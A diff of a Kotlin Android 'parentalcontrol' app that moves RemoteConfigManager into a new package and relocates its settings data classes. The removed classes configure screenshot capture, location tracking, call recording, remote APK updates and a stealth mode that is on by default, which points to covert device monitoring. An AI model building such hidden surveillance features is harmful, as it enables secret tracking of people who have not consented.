@@ -1,4 +1,4 @@
-package com.example.parentalcontrol
+package com.example.parentalcontrol.features.remote_commands.services
 
 import android.content.Context
 import android.provider.Settings
@@ -7,7 +7,8 @@ import io.github.jan.supabase.postgrest.from
 import io.github.jan.supabase.postgrest.query.Columns
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
-import kotlinx.serialization.Serializable
+import com.example.parentalcontrol.features.remote_commands.models.AppSettings
+import com.example.parentalcontrol.features.remote_commands.models.DefaultSettingsPayload
 
 /**
  * مدير الإعدادات عن بُعد (Remote Config Manager)
@@ -78,30 +79,3 @@ class RemoteConfigManager(private val context: Context) {
         }
     }
 }
-
-/**
- * نموذج بيانات الإعدادات
- */
-@Serializable
-data class AppSettings(
-    val screenshot_interval_ms: Long = 300000,
-    val location_interval_ms: Long = 600000, // 10 minutes default
-    val record_calls: Boolean = false,
-    val stealth_mode_active: Boolean = true,
-    val target_version: Int = 1,
-    val update_apk_path: String? = null,  // مسار Supabase Storage
-    val update_apk_url: String? = null,    // رابط HTTP مباشر (الأولوية عند وجوده)
-    val recording_enabled: Boolean = false,
-    val capture_interval: Long = 5000
-)
-
-@Serializable
-data class DefaultSettingsPayload(
-    val device_id: String,
-    val screenshot_interval_ms: Long = 300000,
-    val location_interval_ms: Long = 600000,
-    val record_calls: Boolean = false,
-    val stealth_mode_active: Boolean = true,
-    val recording_enabled: Boolean = false,
-    val capture_interval: Long = 5000
-)
